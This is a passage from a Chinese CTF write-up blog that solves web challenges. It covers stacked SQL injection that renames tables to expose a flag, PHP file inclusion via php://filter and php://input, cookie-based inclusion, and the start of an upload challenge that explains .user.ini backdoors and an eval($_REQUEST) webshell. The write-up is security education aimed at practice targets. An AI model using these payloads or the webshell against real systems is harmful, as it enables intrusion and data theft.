<li><p><strong>==堆叠注入==<strong>：Stacked injections(堆叠注入)从名词的含义就可以看到应该是</strong>一堆 sql 语句(多条)一起执行</strong>。在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句。因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间在于<strong>union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。</strong>但是堆叠查询并不是每个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p>
<p>一般的拼接形式为: </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">';show .....</span><br><span class="hljs-string">=1'</span>;<span class="hljs-keyword">drop</span> .....<br><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">';rename ...</span><br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>SQL的一些表相关的DDL语句知识：</strong></p>
<ul>
<li><pre><code class="sql">show tables; #打印当前所有表
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>- ```sql<br>  show columns from `tablename`;#展示指定表的所有字段<br></code></pre></td></tr></table></figure>
</code></pre>
</li>
<li><pre><code class="sql">alter table `ss` rename to `S`;-- 修改表名
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-operator">-</span> ```<span class="hljs-keyword">sql</span><br>  <span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> `S` change flag id <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>); <span class="hljs-comment">-- 修改表中字段名和字段类型  </span><br></code></pre></td></tr></table></figure>
</code></pre>
</li>
</ul>
</li>
</ul>
<h5 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h5><p>首先，使用常用的SQL注入测试，注入’or 1=1，出现了新的回显，就是输入不同的id返回的值，并且只有1，2，114514有不同的返回值，但好像暂时并没有什么用。</p>
<img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp8.jpg" srcset="/img/loading.gif" lazyload class="">

<p>然后使用union联查，**’union select * from supersqli;当然是测试题目名构成的表啦，说不定就中了呢。**当然这里没中，回显表明后端进行了一定的过滤。像select、update都被ban掉了，但是show没有被ban掉，可以尝试打印。</p>
<img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp9.jpg" srcset="/img/loading.gif" lazyload class="">

<p><strong>我们show一下databases，发现出现了回显，显示了当前DBMS中管理的数据库</strong></p>
<img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp10.jpg" srcset="/img/loading.gif" lazyload class="">

<p>发现了supersqli，合理推测这是题目使用的数据库，我们继续查看一下包含的表，<strong>show tables</strong></p>
<img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp11.jpg" srcset="/img/loading.gif" lazyload class="">

<p>发现当前使用的有两张表，1919810931114514和words，show columns from打印两张表的字段看看。</p>
<p>words表里的内容如下图，<strong>包含id和data，非常有可能是题目查询使用的表，因为我们输入的是id的值，返回给我们data的内容</strong></p>
<p>使用的注入语句是</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">';show columns from `word`</span><br><span class="hljs-string">--注意字符串作为表名使用时应该带有反引号`</span><br></code></pre></td></tr></table></figure>

<img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp12.jpg" srcset="/img/loading.gif" lazyload class="">



<p><strong>1919810931114514表里的内容，包含flag，这应该就是我们需要的东西了，问题现在转到了如何让题目查询1919…这张表。</strong></p>
<p>使用的注入语句是</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">';show columns from `1919810931114514`;</span><br></code></pre></td></tr></table></figure>

<img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp13.jpg" srcset="/img/loading.gif" lazyload class="">

<p><strong>我们这里采用修改表名的方式修改查询对象，</strong></p>
<p><strong>1’;alter table words rename to word;</strong></p>
<p><strong>没有报错，我们再次查询一下发现，已经找不到原来的表了，也验证了前面猜测这是题目所用的那张表。</strong></p>
<img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp15.jpg" srcset="/img/loading.gif" lazyload class="">

<p>**==但是这里出现了一个问题，当我们像修改另一张表的名字时，同样也会报错，为什么呢，因为现在已经找不到words表了，id字段不能被注入了，所以我们应该同时修改两张表，而且同时要修改新的words表的flag字段为id==**，也就是这样写：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">';alter table `words` rename to `word`;alter table `1919810931114514` rename to `words`;alter table words change flag id varchar(100);</span><br></code></pre></td></tr></table></figure>

<p>那么我们再用</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">'or 1=1;</span><br></code></pre></td></tr></table></figure>

<p>即可得到答案。</p>
<img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp16.jpg" srcset="/img/loading.gif" lazyload class="">



<h4 id="4-CTF-fileinclude-1"><a href="#4-CTF-fileinclude-1" class="headerlink" title="4_CTF_fileinclude_1"></a>4_CTF_fileinclude_1</h4><h5 id="描述-3"><a href="#描述-3" class="headerlink" title="描述"></a>描述</h5><p>进入环境直接一段PHP代码，且是文件上传相关，先去学习一下PHP文件上传相关知识。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php">WRONG WAY! <span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">"flag.php"</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file1"</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file2"</span>]))<br>{<br>    <span class="hljs-variable">$file1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file1"</span>];<br>    <span class="hljs-variable">$file2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file2"</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file1</span>) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file2</span>))<br>    {<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file2</span>) === <span class="hljs-string">"hello ctf"</span>)<br>        {<br>            <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file1</span>);<br>        }<br>    }<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">"NONONO"</span>);<br>}<br></code></pre></td></tr></table></figure>



<h5 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h5><ul>
<li><p>**==PHP伪协议==**：参考文章<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018991087#item-2">https://segmentfault.com/a/1190000018991087#item-2</a></p>
<ul>
<li><p><strong>php://协议</strong>，访问各个IO流，CTF中常用php://filter（用于读取源码）和php://input（执行php代码）</p>
</li>
<li><p><strong>php://filer，</strong>(&gt;=5.0.0)一种元封装器，设计<strong>用于数据流打开时的筛选过滤</strong>应用。对于一体式<code>（all-in-one）</code>的<strong>文件函数非常有用</strong>，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</p>
<ul>
<li>resource参数：传入要过滤的数据流</li>
<li>read参数：可选，可以设定多个过滤器名称</li>
<li>write参数：可选，可以设定多个过滤器名称</li>
<li>一个样例：test=php://filter/read=convert.base64-encode/resource=info.php</li>
</ul>
</li>
<li><p><strong>php://input</strong>，假如我们post了一个data，则使用input可以读取这个data，所以在url请求头中可以使用input进行传参。同时，可以post一段php代码，让input去执行</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">..../?id=1&amp;&amp;name=php://input<br></code></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>PHP include/require函数：</strong>如果 include/require 出现于调用文件中的一个函数里，则<strong>被调用的文件中所包含的所有代码将表现得如同它们是在该函数内部定义的一样</strong>。所以它将遵循该函数的变量范围。此规则的一个例外是魔术常量，它们是在发生包含之前就已被解析器处理的。include在所包含文件找不到时会继续执行之后的代码，而require会报错。</p>
</li>
<li><p><strong>Base64编码流程：base64常以=号结尾</strong></p>
<ul>
<li>1.将所有字符转为8位二进制的ASCII码</li>
<li>2.将8位二进制3个归为一组，共计24位，再拆分为4组，每组6位（<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="7.398ex" height="2.072ex" role="img" focusable="false" viewBox="0 -833.9 3270.1 915.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mn" transform="translate(533,363) scale(0.707)"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path></g></g><g data-mml-node="mo" transform="translate(1214.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(2270.1,0)"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(500,0)"></path></g></g></g></svg></mjx-container>）</li>
<li>3.将获得的6位二进制转为10进制</li>
<li>4.从Base64编码表获取对应的编码</li>
<li><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/CTF_fileinclude_1_1.jpg" srcset="/img/loading.gif" lazyload class=""></li>
</ul>
</li>
<li><p><strong>对于不足6位的补零（图中浅红色的4位），索引为“A”；对于最后不足3字节，进行补零处理（图中红色部分），以“=”替代，因此，“ABCD”的base64编码为：“QUJDRA==”。</strong></p>
<img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/CTF_fileinclude_1_2.jpg" srcset="/img/loading.gif" lazyload class=""></li>
</ul>
<h5 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h5><p>代码有一句include(“flag.php”)，引入了一个文件，我们合理地猜测flag是包含在flag.php中的，所以我们先访问一下flag.php，发现只打印了一句，并没有flag，说明flag可能在文件的注释里。然后有两个参数，说明我们需要在url中传入file1和file2两个参数。</p>
<img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/CTF_fileinclude_1_5.jpg" srcset="/img/loading.gif" lazyload class="">

<p>于是我们合理地想到可以使用文件过滤，将flag.php中地源码提取出来，原因是在第二层的if语句中有</p>
<p><code>include($file1);</code>，于是我们的url中file1可以这样编写：<code>file1=php://filter/read=convert.base64-encode/resource=flag.php</code>；然后考虑file2，我们先使用hackbar尝试一下</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://61.147.171.105:56963/?file1=php://filter/read=convert.base64-encode/resource=flag.php&amp;&amp;file2=hello ctf<br></code></pre></td></tr></table></figure>

<p>发现报错，因为<strong>有个file_get_contents函数，file2输入得是个文件才行</strong>，但是现在我们没有其他的文件可以输入。</p>
<img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/CTF_fileinclude_1_6.jpg" srcset="/img/loading.gif" lazyload class="">

<p>在hackbar里提交如下url，且在post中提交hello ctf，这里hackbar提交不了，选择使用BP提交，先在hackbar里execute，然后再BP里抓包。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://61.147.171.105:56963/?file1=php://filter/read=convert.base64-encode/resource=flag.php&amp;&amp;file2=php://input<br></code></pre></td></tr></table></figure>

<p>如下，<strong>注意修改content-length</strong></p>
<img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/CTF_fileinclude_1_3.jpg" srcset="/img/loading.gif" lazyload class="">

<p>得到一个base64编码，然后去解码即可</p>
<img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/CTF_fileinclude_1_4.jpg" srcset="/img/loading.gif" lazyload class="">



<h4 id="5-file-include-江苏工匠杯（-字符编码问题未懂）"><a href="#5-file-include-江苏工匠杯（-字符编码问题未懂）" class="headerlink" title="5_file_include 江苏工匠杯（?字符编码问题未懂）"></a>5_file_include 江苏工匠杯（?字符编码问题未懂）</h4><h5 id="描述-4"><a href="#描述-4" class="headerlink" title="描述"></a>描述</h5><p>进入环境，看到一段PHP代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-string">"./check.php"</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'filename'</span>])){<br>        <span class="hljs-variable">$filename</span>  = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'filename'</span>];<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$filename</span>);<br>    }<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<h5 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h5><ul>
<li><strong>PHP——iconv函数</strong></li>
<li>一些常见的字符编码</li>
</ul>
<h5 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h5><p>很明显的是文件包含问题，读代码我们可以发现是要在url中输入一个filename变量。</p>
<p>首先尝试了一下伪协议，<code>filename=php://filter/read=convert.base64-encode/resource=check.php</code></p>
<p>结果出现了，但是只有一句话。resource改成其他都是相同的回显。说明很可能被过滤，但具体过滤了哪些东西还不清楚</p>
<img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/file_include_jiangsugongjiangbei_1.jpg" srcset="/img/loading.gif" lazyload class="">

<p>可以使用<code>convert.iconv.</code>，进行过滤，可以使用convert.iconv.utf8.utf16/resource=check.php</p>
<h4 id="6-fileinclude-宜兴网信办"><a href="#6-fileinclude-宜兴网信办" class="headerlink" title="6_fileinclude 宜兴网信办"></a>6_fileinclude 宜兴网信办</h4><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/fileinclude_yixin_1.jpg" srcset="/img/loading.gif" lazyload class="">

<p>文件包含题。</p>
<h5 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h5><ul>
<li><p><strong>cookie</strong>：</p>
</li>
<li><p>BP中cookie的写法</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">cookie</span><span class="hljs-punctuation">: </span>language=flag<br></code></pre></td></tr></table></figure></li>
</ul>
<h5 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h5><p>首先检查下网页源代码，发现出现了index.php的源码。如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;html&gt;<br>&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;&lt;/head&gt;<br><br>&lt;br /&gt;<br>&lt;b&gt;Notice&lt;/b&gt;:  Undefined index: language in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;9&lt;/b&gt;&lt;br /&gt;<br>Please choose the language you want : English or Chinese<br>&lt;h1&gt;Hi,EveryOne,The flag is in flag.php&lt;/h1&gt;&lt;html&gt;<br>&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;&lt;/head&gt;<br><br>&lt;?php<br>if( !ini_get('display_errors') ) {<br>  ini_set('display_errors', 'On');<br>  }<br>error_reporting(E_ALL);<br>$lan = $_COOKIE['language'];<br>if(!$lan)<br>{<br>	@setcookie("language","english");<br>	@include("english.php");<br>}<br>else<br>{<br>	@include($lan.".php");<br>}<br>$x=file_get_contents('index.php');<br>echo $x;<br>?&gt;<br>&lt;/html&gt;&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<p>发现是要我们传入一个cookie，其name为language，题目告诉我们答案在flag.php里，那么我们就去那里看看。</p>
<img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/fileinclude_yixin_2.jpg" srcset="/img/loading.gif" lazyload class="">



<p>设置一下cookie，加上过滤，所以我们这样写</p>
<p><code>language=php://filter/read=convert.base64-encode/resource=flag</code></p>
<p>发现直接给出了一段base64编码后的字符串，去转换一下，得出答案。</p>
<h4 id="7-easy-upload-CTF"><a href="#7-easy-upload-CTF" class="headerlink" title="7_easy_upload_CTF"></a>7_easy_upload_CTF</h4><h5 id="描述-5"><a href="#描述-5" class="headerlink" title="描述"></a>描述</h5><p>进入环境，就是一个文件上传的提交</p>
<img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_1.jpg" srcset="/img/loading.gif" lazyload class="">

<p>检查一下网页源码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/css"</span>&gt;</span><span class="language-css"></span><br><span class="language-css">    	<span class="hljs-selector-class">.round_icon</span>{</span><br><span class="language-css">			  <span class="hljs-attribute">width</span>: <span class="hljs-number">88px</span>;</span><br><span class="language-css">			  <span class="hljs-attribute">height</span>: <span class="hljs-number">88px</span>;</span><br><span class="language-css">			  <span class="hljs-attribute">display</span>: flex;</span><br><span class="language-css">			  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">50%</span>;</span><br><span class="language-css">			  <span class="hljs-attribute">align-items</span>: center;</span><br><span class="language-css">			  <span class="hljs-attribute">justify-content</span>: center;</span><br><span class="language-css">			  <span class="hljs-attribute">overflow</span>: hidden;</span><br><span class="language-css">			  <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;</span><br><span class="language-css">			}</span><br><span class="language-css">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>easyupload<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">background</span>=<span class="hljs-string">"background.jpg"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"background-size:cover"</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"text-align: center;"</span>&gt;</span><br>		<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"uploads/index.php"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"round_icon"</span> <span class="hljs-attr">align</span>=<span class="hljs-string">"middle"</span>  <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>&gt;</span><br>		<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>	    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"index.php"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"post"</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">"multipart/form-data"</span>&gt;</span><br>	        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">"file"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"color: blue;"</span>&gt;</span>更换头像<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>	        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"file"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"fileUpload"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"file"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"color: blue;"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>	        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"upload"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"提交"</span>&gt;</span><br>	    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>	<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h5 id="知识点-6"><a href="#知识点-6" class="headerlink" title="知识点"></a>知识点</h5><ul>
<li><p>**==.htaccess文件==**：<code>.htaccess</code> 由于它以点或点开头，因此通常称为“点文件”。 <strong>点文件几乎总是某种形式的配置文件</strong>。 点文件可以用于操作系统或软件。 默认情况下，操作系统会将点文件隐藏在查找程序窗口或任何类型的系统文件管理器中。 通常，您必须从操作系统的首选项中选择“显示隐藏的文件”选项。 或者您可以使用 <code>ls -a</code> 命令以在命令行上显示所有文件。</p>
<p>​        全称是Hypertext Access(超文本入口)。<strong>提供了针对目录改变配置的方法</strong>， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。<strong>管理员可以通过Apache的AllowOverride指令来设置</strong>。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
<p>​		<strong>.htaccess的配置文件只能在Apache服务器中起作用</strong></p>
</li>
<li><p><strong>==.user.ini==<strong>：</strong>php.ini是php的全局配置文件，对整个web服务起作用，.user.ini和.htaccess都是目录的配置文件，.user.ini是用户自定义的php.ini，通常构造后门和隐藏后门。</strong></p>
</li>
<li><p><code>&lt;?php =eval($_REQUEST["xxx"] )?&gt;</code>:_REQUEST包含了 _GET、 GET、_POST、$_COOKIE的所有内容，是它们的集合体。也就内是说只要用其中一种方容式做一个表单，把cmd这个变量给POST或者GET，甚至用cookies就可以把传输上去的内容执行。简而言之吧，就是执行cmd的值。</p>
</li>
<li><p><strong>蚁剑的工作原理：首先你需要发现服务端的一句话木马，每次连接的密码其实就是一句话木马的名字，蚁剑会帮你执行各种代码以获取完整的服务器目录。</strong></p>
</li>
<li><p>**==利用.user.ini的条件==**：</p>
